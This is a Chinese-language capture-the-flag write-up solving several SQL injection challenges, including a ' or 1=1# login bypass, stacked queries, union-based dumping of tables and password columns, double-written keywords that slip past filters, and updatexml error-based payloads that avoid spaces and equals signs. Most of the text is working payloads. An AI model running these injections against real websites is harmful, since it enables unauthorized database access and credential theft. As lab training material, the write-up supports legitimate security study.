签到题

[极客大挑战 2019]EasySQL(万能密码)

熟悉的界面，随便试试登陆，发现万能密码就可以登陆成功然后拿到flag

用户名：（随便打）

密码：111’ or 1=1#

堆叠注入

[SUCTF 2019]EasySQL

题目环境如下，输入1，2，3有回显，回显都为1。但是过滤了union，联合查询行不通

构造1;show databases;可以看到数据库名为”Flag”

但是查询的时候就发现”Flag”被过滤了，没有什么思路，看了大佬们的wp。据说原题是有源码泄露，可以看到sql语句的构造如下。

看到这里就比较明显了

方法1：构造*,1进行查询即可得到flag。

方法2：据说Oracle数据可以用”||”来拼接字符串，但是mysql不行。但是可以设置，构造

1;set sql_mode=PIPES_AS_CONCAT;select 1，将sql语句中的”||”作用修改为拼接字符串。此时就可以让”1”和flag字段拼接起来，返回查询结果。

union注入

[极客大挑战 2019]LoveSQL

同样熟悉的场景，先采用万能密码登陆，但是发现登陆成功后不是直接给flag了，而是告诉我admin用户的密码。

所以我们可能需要去数据库里探索一下flag了，上联合查询。

1.将构造如下密码1' or 1=1 group by 4#，按照第4个字段排序。回显如下，说明查询的字段不足4个，把4改成3，登陆成功。此时确定查询的字段为3。

2.构造密码1' union select 1,2,3#，发现两个回显点分别是2和3

3.查数据库名，1' union select 1,database(),3#，

4.查表名，1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#

5.查列名，1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='l0ve1ysq1'#

6.查字段，1' union select 1,group_concat(id,username,password),3 from l0ve1ysq1#，拿到flag

[极客大挑战 2019]BabySQL（双写绕过过滤）

此题与上题LoveSQL类似，不过这里加多了一些非法关键字过滤。在使用上文的方法时会发现，union和select关键字都被过滤了，不过好在应该是用的是替换过滤，就是用空字符去替换非法关键字，我们稍微用双写进行绕过即可。

1.找回显点，1' uniounionn sselectelect 1,2,3#，与上题类似，回显点是2和3

2.爆数据库名，1' uniounionn sselectelect 1,database(),3#

3.爆表名，1' uniounionn sselectelect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#，报错如下，发现我们输入的where关键字被过滤了，还是进行双写绕过，wwherehere

然后发现”.tables”这里报错，应该是”information_schema”出了问题，经验告诉我应该是“or”被过滤了，而”information”里有or，因此改成双写”infoorrmation”绕过即可

改完后发现仍然报错，往前找，应该是from被过滤，继续双写，最终语句为1' uniounionn sselectelect 1,group_concat(table_name),3 frofromm infoorrmation_schema.tables wwherehere table_schema=database()#

4.爆列名，1' uniounionn sselectelect 1,group_concat(column_name),3 frofromm infoorrmation_schema.columns wwherehere table_name='b4bsql'#

5.查询字段，拿到flag1' uniounionn sselectelect 1,2,group_concat(id,username,passwoorrd) frofromm b4bsql#，注意”password”里也有”or”，要记得双写。

报错注入

[极客大挑战 2019]HardSQL

这题同样也过滤了很多关键字，如and、union、=。但不像BabySQL，此题不是替换过滤，因此简单的双写绕过不顶用，尝试进行报错注入。

此处使用updatexml函数，该函数第二个参数要传递Xpath格式的字符串。这里我认为不必过多了解，只需要知道以0x7e（”~”）开头的内容不是xml格式的语法，因此会报错。但是报错时，会将concat函数括号内的执行结果显示出来，因此我们可以利用这一点进行注入。

1.查询数据库名，check.php?username=1'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=1

2.表名，check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=1

注意此处等号和空格都被过滤，我们可以利用括号代替空格来区分各个词，用like替代等号

3.列名，check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=1

4.获得flag，check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23&password=1

5.出题人玩我呢，只能看到一半flag，不过利用right函数即可看到右半部分check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))%23&password=1
